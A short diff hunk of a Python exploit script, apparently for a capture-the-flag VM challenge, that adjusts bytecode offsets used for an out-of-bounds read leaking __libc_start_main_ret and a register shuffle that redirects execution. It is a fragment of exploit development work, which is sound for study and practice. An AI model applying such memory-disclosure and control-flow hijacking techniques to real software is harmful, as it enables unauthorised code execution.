@@ -222,10 +222,10 @@ with tempfile.NamedTemporaryFile("wb") as f:
     for i in range(1, 256):
         bytecode += VM_SET_R_16(i, i)
     # oob read @ bytecode[0x8010] == __libc_start_main_ret
-    bytecode += VM_SET_R_16(0x18, 0x8010)
+    bytecode += VM_SET_R_16(0x10, 0x8010)
     # __libc_start_main_ret bytes goes into r0, r1, r2, r3, r4, r5, r6
     # r0 is 0x83 so after shuffle, we execute insn at 0x87
-    bytecode += VM_SHUFFLE_REGS(6, 0x18, 0)
+    bytecode += VM_SHUFFLE_REGS(6, 0x10, 0)
 
     f.write(bytecode)
     f.flush()
